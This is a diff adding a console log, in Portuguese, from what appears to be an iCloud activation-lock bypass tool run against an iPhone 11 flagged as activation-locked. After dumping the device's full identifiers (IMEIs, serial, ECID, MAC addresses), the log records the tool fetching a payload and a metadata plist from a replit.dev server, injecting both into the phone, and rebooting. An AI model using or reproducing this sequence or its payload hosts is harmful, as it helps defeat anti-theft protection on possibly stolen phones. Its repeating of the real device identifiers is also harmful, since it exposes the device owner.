@@ -1,0 +1,148 @@
+Aplicação iniciada...
+═══════════════════════════════════════════════════════
+[INICIO] Detectando dispositivo...
+[OK] iOS.exe encontrado!
+
+{"deviceList":["00008030-00066D6C2E39802E"]}
+
+2025/11/26 19:20:38 INFO Go-iOS Agent not running, starting it on port port=60105
+2025/11/26 19:20:38 INFO Waiting for go-ios agent to be ready...
+{"level":"warning","msg":"go-ios agent is not running. You might need to start it with 'ios tunnel start' for ios17+. Use ENABLE_GO_IOS_AGENT=user for userspace tunnel or ENABLE_GO_IOS_AGENT=kernel for kernel tunnel for the experimental daemon mode.","time":"2025-11-26T19:20:38+01:00"}
+
+
+
+
+[OK] UDID capturado: 00008030-00066D6C2E39802E
+[OK] ✓ Comando funcionou na tentativa 1!
+
+{"ActivationState":"Unactivated","BasebandActivationTicketVersion":"V2","BasebandCertId":524245983,"BasebandChipID":104,"BasebandKeyHashInformation":{"AKeyStatus":64,"SKeyStatus":2},"BasebandMasterKeyHash":"1B41607650EBF11C6B39F41CB267DC64C121A9BCF44DBA5D28F55ACC86361BBA366554CD57B4C466055803E1EF81C870","BasebandRegionSKU":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==","BasebandSerialNumber":"FT+us6dj+PoAAAAA","BasebandStatus":"BBInfoAvailable","BasebandVersion":"7.00.00","BluetoothAddress":"f4:db:e3:49:75:14","BoardId":4,"BootSessionID":"039CCC2D-B33C-4B2A-B6DD-55A12A13C2D9","BrickState":true,"BuildVersion":"23B85","CPUArchitecture":"arm64e","CarrierBundleInfoArray":[],"CertID":524245983,"ChipID":32816,"ChipSerialNo":"FT+us6dj+PoAAAAA","DeviceClass":"iPhone","DeviceColor":"1","DeviceName":"iPhone","DieID":1809161259679790,"EthernetAddress":"f4:db:e3:52:48:e0","FirmwareVersion":"iBoot-13822.42.2","FusingStatus":3,"HardwareModel":"N104AP","HardwarePlatform":"t8030","HasSiDP":true,"HostAttached":true,"HumanReadableProductVersionString":"26.1","InternationalMobileEquipmentIdentity":"352921117916354","InternationalMobileEquipmentIdentity2":"352921117903436","MLBSerialNumber":"F3Y01720125L73XF","MobileEquipmentIdentifier":"35292111791635","MobileSubscriberCountryCode":"","MobileSubscriberNetworkCode":"","ModelNumber":"MWLT2","NonVolatileRAM":{"StartupMute":"MQ==","SystemAudioVolumeSaved":"MQ==","auto-boot":"dHJ1ZQ==","backlight-level":"MTQxNA==","backlight-nits":"MHgwMDllYzExNw==","boot-args":"","bootdelay":"MA==","fm-account-masked":"beKAouKAouKAouKAouKAokBpY2xvdWQuY29t","fm-activation-locked":"WUVT","fm-spkeys":"YnBsaXN0MDDWAQIDBAUGBwgJCgsMUXBRaVFsUXNRYlF2TxA5BNrZtMK5iQ2uASm0v2uXWTqphEBnSAkxKhFE41oAdqO926cBc+w77O6vjTScz44X80JdtZ8aQqK4EAFPEBDfbjhN5HtDJ7Ho3iVrG5HTTxAgvnZnANTFskeL7qONel6pxw2Tl2m0IH9X7RBkHFNUiVYzQcVpVXs4xljSDQ4PFFEyUTHSEBESE1FsUXMQABBg0hAREhMIFRcZGx0fIV1fcpWeo6WnrK6wsrQAAAAAAAABAQAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAuQ==","fm-spstatus":"WUVT","panicmedic-telemetry":"EQEAAAAAAAC6e7tsg0QGALp7u2yDRAYAQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=","usbcfwflasherResult":"Tm8gZXJyb3Jz"},"PairRecordProtectionClass":4,"PartitionType":"GUID_partition_scheme","PasswordProtected":false,"PkHash":"Hz9b38WSRX/cE6qam0xEfaM6v7nHw0ZdWjTPu2WOXVU=","ProductName":"iPhone OS","ProductType":"iPhone12,1","ProductVersion":"26.1","ProductionSOC":true,"ProtocolVersion":"2","RegionInfo":"CN/A","SIMStatus":"kCTSIMSupportSIMStatusNotInserted","SIMTrayStatus":"kCTSIMSupportSIMTrayAbsent","SerialNumber":"DNPCM0BJN735","SoftwareBehavior":"AQQAAAAAAAAAAAAAAAAAAA==","SoftwareBundleVersion":"","SupportedDeviceFamilies":[1],"TelephonyCapability":true,"TimeIntervalSince1970":1764181238.170546,"TimeZone":"US/Pacific","TimeZoneOffsetFromUTC":-28800,"TrustedHostAttached":true,"UniqueChipID":1809161259679790,"UniqueDeviceID":"00008030-00066D6C2E39802E","UntrustedHostBUID":"3117415134588655470232864","UseRaptorCerts":true,"Uses24HourClock":false,"WiFiAddress":"f4:db:e3:59:c5:a4","WirelessBoardSerialNumber":"F0001AD66633","kCTPostponementStatus":"kCTPostponementStatusReady"}
+
+{"level":"warning","msg":"failed to get tunnel info","time":"2025-11-26T19:20:38+01:00","udid":"00008030-00066D6C2E39802E"}
+
+• ActivationState: "Unactivated"
+• BasebandActivationTicketVersion: "V2"
+• BasebandCertId: 524245983
+• BasebandChipID: 104
+• BasebandKeyHashInformation: {"AKeyStatus":64,"SKeyStatus":2}
+• BasebandMasterKeyHash: "1B41607650EBF11C6B39F41CB267DC64C121A9BCF44DBA5D28F55ACC86361BBA366554CD57B4C46...
+• BasebandRegionSKU: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+• BasebandSerialNumber: "FT+us6dj+PoAAAAA"
+• BasebandStatus: "BBInfoAvailable"
+• BasebandVersion: "7.00.00"
+• BluetoothAddress: "f4:db:e3:49:75:14"
+• BoardId: 4
+• BootSessionID: "039CCC2D-B33C-4B2A-B6DD-55A12A13C2D9"
+• BrickState: true
+• BuildVersion: "23B85"
+• CPUArchitecture: "arm64e"
+• CarrierBundleInfoArray: []
+• CertID: 524245983
+• ChipID: 32816
+• ChipSerialNo: "FT+us6dj+PoAAAAA"
+• DeviceClass: "iPhone"
+• DeviceColor: "1"
+• DeviceName: "iPhone"
+• DieID: 1809161259679790
+• EthernetAddress: "f4:db:e3:52:48:e0"
+• FirmwareVersion: "iBoot-13822.42.2"
+• FusingStatus: 3
+• HardwareModel: "N104AP"
+• HardwarePlatform: "t8030"
+• HasSiDP: true
+• HostAttached: true
+• HumanReadableProductVersionString: "26.1"
+• InternationalMobileEquipmentIdentity: "352921117916354"
+• InternationalMobileEquipmentIdentity2: "352921117903436"
+• MLBSerialNumber: "F3Y01720125L73XF"
+• MobileEquipmentIdentifier: "35292111791635"
+• MobileSubscriberCountryCode: ""
+• MobileSubscriberNetworkCode: ""
+• ModelNumber: "MWLT2"
+• NonVolatileRAM: {"StartupMute":"MQ==","SystemAudioVolumeSaved":"MQ==","auto-boot":"dHJ1ZQ==","ba...
+• PairRecordProtectionClass: 4
+• PartitionType: "GUID_partition_scheme"
+• PasswordProtected: false
+• PkHash: "Hz9b38WSRX/cE6qam0xEfaM6v7nHw0ZdWjTPu2WOXVU="
+• ProductName: "iPhone OS"
+• ProductType: "iPhone12,1"
+• ProductVersion: "26.1"
+• ProductionSOC: true
+• ProtocolVersion: "2"
+• RegionInfo: "CN/A"
+• SIMStatus: "kCTSIMSupportSIMStatusNotInserted"
+• SIMTrayStatus: "kCTSIMSupportSIMTrayAbsent"
+• SerialNumber: "DNPCM0BJN735"
+• SoftwareBehavior: "AQQAAAAAAAAAAAAAAAAAAA=="
+• SoftwareBundleVersion: ""
+• SupportedDeviceFamilies: [1]
+• TelephonyCapability: true
+• TimeIntervalSince1970: 1764181238.170546
+• TimeZone: "US/Pacific"
+• TimeZoneOffsetFromUTC: -28800
+• TrustedHostAttached: true
+• UniqueChipID: 1809161259679790
+• UniqueDeviceID: "00008030-00066D6C2E39802E"
+• UntrustedHostBUID: "3117415134588655470232864"
+• UseRaptorCerts: true
+• Uses24HourClock: false
+• WiFiAddress: "f4:db:e3:59:c5:a4"
+• WirelessBoardSerialNumber: "F0001AD66633"
+• kCTPostponementStatus: "kCTPostponementStatusReady"
+[OK] Model encontrado (ProductName): iPhone OS
+[OK] Serial encontrado (SerialNumber): DNPCM0BJN735
+[OK] Product Type encontrado (ProductType): iPhone12,1
+[OK] iOS encontrado (ProductVersion): 26.1
+[OK] ECID encontrado (UniqueChipID): 1809161259679790
+[OK] IMEI encontrado (InternationalMobileEquipmentIdentity): 352921117916354
+[OK] IMEI2 encontrado (InternationalMobileEquipmentIdentity2): 352921117903436
+[OK] Activated encontrado (ActivationState): Unactivated
+
+[✓ OK] iPhone DETECTADO COM SUCESSO!
+═══════════════════════════════════════════════════════
+[*] Gerando payload Hello Activation...
+═══════════════════════════════════════════════════════
+[INIT] SEQUÊNCIA DE ATIVAÇÃO INICIADA
+═══════════════════════════════════════════════════════
+[*] PHASE 1: Reboot Inicial
+[*] PHASE 2: Extraindo GUID do Syslog
+[AVISO] GUID não encontrado, usando UDID como fallback
+[OK] GUID: 00008030-00066D6C2E39802E
+[*] PHASE 3: Requisitando Payload do Servidor
+[OK] Payload URL: http://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev/cache/stage3/d8ca2f7ba02eb2c3/payload.png
+[*] PHASE 4: Baixando Payload
+[OK] Payload baixado: 16384 bytes
+[*] PHASE 4.5: Aguardando reconexão do dispositivo...
+[*] Aguardando... (1/15)
+[*] Aguardando... (2/15)
+[*] Aguardando... (3/15)
+[*] Aguardando... (4/15)
+[*] Aguardando... (5/15)
+[*] Aguardando... (6/15)
+[OK] Dispositivo reconectado! (tentativa 7/15)
+[*] PHASE 5: Limpando Arquivos Antigos
+[*] PHASE 6: Injetando Payload
+[OK] Payload injetado
+[*] PHASE 7: Reboot Pós-Injeção
+[*] Aguardando 30 segundos para dispositivo reconectar e processar payload...
+[*] PHASE 8: Aguardando Metadados (até 100 segundos)
+[*] Procurando: /iTunes_Control/iTunes/iTunesMetadata.plist
+[AVISO] Arquivo não encontrado após 6 tentativas e 20 segundos
+[*] Procurando: /Library/Caches/LocationKit/ReverseGeocode.cache
+[AVISO] Arquivo não encontrado após 6 tentativas e 20 segundos
+[*] Procurando: /var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/ActivationState.plist
+[AVISO] Arquivo não encontrado após 6 tentativas e 20 segundos
+[*] Procurando: /var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist
+[AVISO] Arquivo não encontrado após 6 tentativas e 20 segundos
+[*] Procurando: /var/Keychains/TrustStore.sqlite3
+[AVISO] Arquivo não encontrado após 6 tentativas e 20 segundos
+[!] Metadados não encontrados
+[*] Continuando mesmo assim...
+[*] PHASE 8.5: Baixando iTunesMetadata do servidor...
+[*] URL: https://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev/metadata.php?prd=iPhone12%2C1&guid=00008030-00066D6C2E39802E&sn=DNPCM0BJN735
+[✓] Arquivo baixado (686 bytes)
+[*] Injetando em /var/mobile/Media/Books/iTunesMetadata.plist
+[✓] iTunesMetadata injetado com sucesso!
+[*] PHASE 9: Reboot Final
+═══════════════════════════════════════════════════════
+[✓] SEQUÊNCIA CONCLUÍDA COM SUCESSO!
+═══════════════════════════════════════════════════════
